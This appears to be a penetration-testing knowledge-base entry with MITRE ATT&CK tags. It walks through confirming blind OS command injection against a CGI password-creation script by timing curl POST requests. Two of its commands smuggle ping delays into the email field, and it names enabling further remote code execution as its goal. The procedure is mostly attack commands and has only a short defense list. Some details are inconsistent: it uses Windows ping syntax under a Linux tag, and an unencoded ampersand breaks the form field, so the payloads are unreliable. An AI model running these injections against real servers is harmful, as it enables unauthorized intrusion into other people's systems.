---
tags:
  - command-injection
  - time-based
  - confirmation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ping-injection-10]]'
  - '[[commands/ping-injection-20]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-13T23:52:38.995Z'
sub_techniques: []
id: 470607c7-9b49-4513-b957-5291c5ea5361
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Confirm Command Injection with Time Delays

## Summary

This procedure confirms blind OS command injection by measuring response time differences when injecting ping commands with varying delays.

## Description

By comparing baseline times to those with ping -n 10 and -n 20, delays of 10s and 20s prove command execution on the server. This time-based inference validates the injection without direct output.

## Requirements

1. Accurate timing tool (e.g., time command in bash)
2. Consistent network conditions
3. Prior successful POST injection

## Defense

Defensive measures and detection strategies:

- Limit command execution timeouts
- Log and alert on long-running processes
- Validate input lengths and characters

## Objectives

1. Benchmark normal vs. injected response times
2. Infer successful command chaining
3. Enable further RCE exploitation

## Instructions

### Step 1: Measure Baseline Time

**Context**: Time a normal POST request.

**Command** (Baseline):
```bash
time curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "email=random@example.com&ibm-submit=Submit" http://target/cgi-bin/PasswordCreate.pl
```

> Expected output: Response in <1s.

### Step 2: Inject and Time 10s Delay

**Context**: Inject ping for 10s delay.

**Command** ([[commands/ping-injection-10]]):
```bash
time curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "email=;&ping -n 10 1.1.1.1;&ibm-submit=Submit" http://target/cgi-bin/PasswordCreate.pl
```

> Expected output: ~10s delay.

### Step 3: Inject and Time 20s Delay

**Context**: Confirm with longer delay.

**Command** ([[commands/ping-injection-20]]):
```bash
time curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "email=;&ping -n 20 1.1.1.1;&ibm-submit=Submit" http://target/cgi-bin/PasswordCreate.pl
```

> Expected output: ~20s delay, proving injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/ping-injection-10]]
- [[commands/ping-injection-20]]

## Tools Used


## Tags

- [[command-injection]]
- [[time-based]]
- [[confirmation]]
